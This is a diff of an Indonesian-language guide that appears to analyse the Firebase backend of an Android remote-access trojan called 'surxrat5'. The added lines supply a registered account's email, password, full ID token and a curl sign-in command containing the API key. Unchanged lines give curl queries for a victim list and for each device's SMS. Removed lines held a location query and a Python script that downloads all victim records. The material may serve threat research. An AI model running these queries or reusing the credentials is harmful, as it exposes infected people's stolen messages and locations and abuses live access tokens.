@@ -16,27 +16,33 @@ Berdasarkan analisis file `index-0CLwk5Y_.js`, berikut adalah kredensial yang di
 
 ---
 
-## 2. Cara Mendapatkan ID Token (Autentikasi)
-Database ini dilindungi oleh Firebase Security Rules, sehingga Anda memerlukan `ID Token` yang valid untuk membaca data. Token ini didapat dengan melakukan Login (Sign In) ke Firebase Auth.
+## 2. Research Account Credentials (Aktif)
+Akun berikut telah didaftarkan untuk keperluan analisis saat ini:
+
+*   **Email:** `gemini_test_research@gmail.com`
+*   **Password:** `ResearchPassword123!`
+*   **ID Token (Valid ~1 Jam):** 
+    `eyJhbGciOiJSUzI1NiIsImtpZCI6ImEyZGZiOGEzOGI1MmQ5ZjA5ZWRjYWE1MDcwYTBlOGYwYTllMDk4YmEiLCJ0eXAiOiJKV1QifQ.eyJpc3MiOiJodHRwczovL3NlY3VyZXRva2VuLmdvb2dsZS5jb20vZmlyLWU5ZTdiIiwiYXVkIjoiZmlyLWU5ZTdiIiwiYXV0aF90aW1lIjoxNzczMDUyNDA3LCJ1c2VyX2lkIjoiNEUzelZHcnNpQlYwSXd6RWJMb1ZRQTFvejFxMiIsInN1YiI6IjRFM3pWR3JzaUJWMEl3ekViTG9WUUExb3oxcTIiLCJpYXQiOjE3NzMwNTI0MDcsImV4cCI6MTc3MzA1NjAwNywiZW1haWwiOiJnZW1pbmlfdGVzdF9yZXNlYXJjaEBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6ZmFsc2UsImZpcmViYXNlIjp7ImlkZW50aXRpZXMiOnsiZW1haWwiOlsiZ2VtaW5pX3Rlc3RfcmVzZWFyY2hAZ21haWwuY29tIl19LCJzaWduX2luX3Byb3ZpZGVyIjoicGFzc3dvcmQifX0.l7vB4UdpWA_4Egx1A2t2VrwxSWEw9ceIJTHVVOH__NtRCenm-H0NI5QbUkw2ph1RWIFkIwrP2Anv0TY_QUOdIFegyHUZL1S8ZUIdWsj8QfbJbxQE0djLc44bEsIEEioXkrUHdHcm-9JRGSHv-LcDHAaCwZCXUy4RPe1rGsff1JGtkvkltDQQuCxFhm5gxfqIlK_9N8d2XoZuajvKtxz_hW9PMoNw7YuOf_8gVnVvy569NzomTK8WYDQmizMsFCfYvCWQncdMmVMgOsVlbJdqzT4Mp1_H_Gb7PiWQ4fX2oNgSBeLxZILw6hZkkEd5uyqYz3YJemzmtuw9l0tkGSaYdA`
+
+---
+
+## 3. Cara Mendapatkan ID Token Baru
+Database ini dilindungi oleh Firebase Security Rules, sehingga Anda memerlukan `ID Token` yang valid. Token ini didapat dengan melakukan Login (Sign In).
 
 ### Menggunakan cURL:
-Ganti `EMAIL` dan `PASSWORD` dengan akun yang sudah terdaftar (atau daftar akun baru menggunakan endpoint `signUp`).
-
 ```bash
 curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key=AIzaSyDfHMsNoknifGnkJEr6DJPSoEiwmbmlYBc" \
 -H "Content-Type: application/json" \
 -d '{
-    "email": "USER_EMAIL_ANDA@gmail.com",
-    "password": "PASSWORD_ANDA",
+    "email": "gemini_test_research@gmail.com",
+    "password": "ResearchPassword123!",
     "returnSecureToken": true
 }'
 ```
 
-**Hasil:** Anda akan menerima JSON yang berisi `idToken`. Copy token tersebut.
-
 ---
 
-## 3. Cara Query Data (Realtime Database)
+## 4. Cara Query Data (Realtime Database)
 Setelah mendapatkan `idToken`, Anda dapat mengakses endpoint database menggunakan parameter `auth`.
 
 ### A. Melihat Daftar Victim (Metadata)
@@ -48,49 +54,6 @@ curl -s "https://fir-e9e7b-default-rtdb.firebaseio.com/surxrat5.json?auth=ID_TOK
 Ganti `DEVICE_ID` dengan ID yang ditemukan di daftar victim.
 ```bash
 curl -s "https://fir-e9e7b-default-rtdb.firebaseio.com/database/sms/DEVICE_ID.json?auth=ID_TOKEN_ANDA"
-```
-
-### C. Melihat Lokasi Terakhir
-```bash
-curl -s "https://fir-e9e7b-default-rtdb.firebaseio.com/surxrat5/DEVICE_ID/loc.json?auth=ID_TOKEN_ANDA"
-```
-
----
-
-## 4. Script Otomasi (Python)
-Gunakan script ini untuk mengunduh data secara otomatis.
-
-```python
-import requests
-import json
-
-# Konfigurasi
-API_KEY = "AIzaSyDfHMsNoknifGnkJEr6DJPSoEiwmbmlYBc"
-DB_URL = "https://fir-e9e7b-default-rtdb.firebaseio.com"
-EMAIL = "EMAIL_ANDA"
-PASSWORD = "PASSWORD_ANDA"
-
-def get_token():
-    url = f"https://identitytoolkit.googleapis.com/v1/accounts:signInWithPassword?key={API_KEY}"
-    payload = {"email": EMAIL, "password": PASSWORD, "returnSecureToken": True}
-    r = requests.post(url, json=payload)
-    return r.json().get('idToken')
-
-def fetch_data(path, token):
-    url = f"{DB_URL}/{path}.json?auth={token}"
-    r = requests.get(url)
-    return r.json()
-
-# Jalankan
-token = get_token()
-if token:
-    print("Login Berhasil!")
-    victims = fetch_data("surxrat5", token)
-    print(f"Total Victim: {len(victims)}")
-    
-    # Simpan ke file
-    with open('data_surxrat.json', 'w') as f:
-        json.dump(victims, f, indent=4)
 ```
 
 ---
